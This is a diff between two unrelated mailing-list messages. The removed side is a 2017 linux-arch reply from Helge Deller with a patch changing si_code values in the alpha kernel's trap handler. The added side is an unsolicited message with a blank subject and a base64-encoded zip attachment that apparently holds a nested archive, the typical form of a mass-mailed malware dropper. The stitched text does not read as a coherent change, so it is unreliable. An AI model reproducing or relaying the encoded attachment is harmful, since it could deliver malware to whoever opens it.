@@ -1,70 +1,74 @@
-From: Helge Deller <deller@gmx.de>
-Subject: Re: [PATCH 1/8] signal/alpha: Document a conflict with SI_USER for
- SIGTRAP
-Date: Sun, 2 Jul 2017 16:13:20 +0200
-Message-ID: <20170702141320.GA32254@ls3530.fritz.box>
-References: <87efu22set.fsf@xmission.com>
- <20170630123906.8865-1-ebiederm@xmission.com>
+From: <tchidrenplytoo@aim.com>
+Subject: (unknown)
+Date: Sun, 02 Jul 2017 18:44:40 -0000
+Message-ID: <149902108043.29695.1107711051069851440@permonline.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-alpha-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20170630123906.8865-1-ebiederm@xmission.com>
-Sender: linux-alpha-owner@vger.kernel.org
-To: "Eric W. Biederman" <ebiederm@xmission.com>
-Cc: linux-kernel@vger.kernel.org, Andy Lutomirski <luto@kernel.org>, Linus Torvalds <torvalds@linux-foundation.org>, Al Viro <viro@zeniv.linux.org.uk>, Oleg Nesterov <oleg@redhat.com>, Andrei Vagin <avagin@virtuozzo.com>, Thomas Gleixner <tglx@linutronix.de>, Greg KH <greg@kroah.com>, Andrey Vagin <avagin@openvz.org>, Serge Hallyn <serge@hallyn.com>, Pavel Emelyanov <xemul@virtuozzo.com>, Cyrill Gorcunov <gorcunov@openvz.org>, Peter Zijlstra <peterz@infradead.org>, Willy Tarreau <w@1wt.eu>, linux-arch@vger.kernel.org, linux-api@vger.kernel.org, Linux Containers <containers@lists.linux-foundation.org>, Michael Kerrisk <mtk.manpages@gmail.com>, Richard Henderson <rth@twiddle.net>, Ivan Kokshaysky <ink@jurassic.park.msu.ru>, Matt Turner <mattst88@gmail.com>
-List-Id: linux-arch.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_23646323904760_linux-arch.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-arch-owner@vger.kernel.org>
+Received: from 90.150.122.132.permonline.ru ([90.150.122.132]:49606 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751760AbdGBSop (ORCPT
+        <rfc822;linux-arch@vger.kernel.org>); Sun, 2 Jul 2017 14:44:45 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-arch-owner@vger.kernel.org
+List-ID: <linux-arch.vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-* Eric W. Biederman <ebiederm@xmission.com>:
-> Setting si_code to __SI_FAULT results in a userspace seeing
-> an si_code of 0.  This is the same si_code as SI_USER.  Posix
-> and common sense requires that SI_USER not be a signal specific
-> si_code.  As such this use of 0 for the si_code is a pretty
-> horribly broken ABI.
-> 
-> Given that alpha is on it's last legs I don't know that it is worth
-> fixing this, but it is worth documenting what is going on so that
-> no one decides to copy this bad decision.
-
-The ABI was already broken, so IMHO I think it's better to somehow "fix"
-it instead. Agreed, alpha and some other architectures are already aged,
-but nevertheless most of them build in debian-ports.  Below is a
-suggested fix which reuses/misuses other existing trap codes instead.
-
-Helge
-
-Signed-off-by: Helge Deller <deller@gmx.de>
-
-diff --git a/arch/alpha/kernel/traps.c b/arch/alpha/kernel/traps.c
-index 65bb102..2ed37dd 100644
---- a/arch/alpha/kernel/traps.c
-+++ b/arch/alpha/kernel/traps.c
-@@ -278,7 +278,7 @@ do_entIF(unsigned long type, struct pt_regs *regs)
- 	      case 1: /* bugcheck */
- 		info.si_signo = SIGTRAP;
- 		info.si_errno = 0;
--		info.si_code = __SI_FAULT;
-+		info.si_code = TRAP_HWBKPT;
- 		info.si_addr = (void __user *) regs->pc;
- 		info.si_trapno = 0;
- 		send_sig_info(SIGTRAP, &info, current);
-@@ -318,7 +318,7 @@ do_entIF(unsigned long type, struct pt_regs *regs)
- 			break;
- 		case GEN_ROPRAND:
- 			signo = SIGFPE;
--			code = __SI_FAULT;
-+			code = FPE_FLTSUB;
- 			break;
- 
- 		case GEN_DECOVF:
-@@ -340,7 +340,7 @@ do_entIF(unsigned long type, struct pt_regs *regs)
- 		case GEN_SUBRNG7:
- 		default:
- 			signo = SIGTRAP;
--			code = __SI_FAULT;
-+			code = TRAP_HWBKPT;
- 			break;
- 		}
- 
-
-
+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
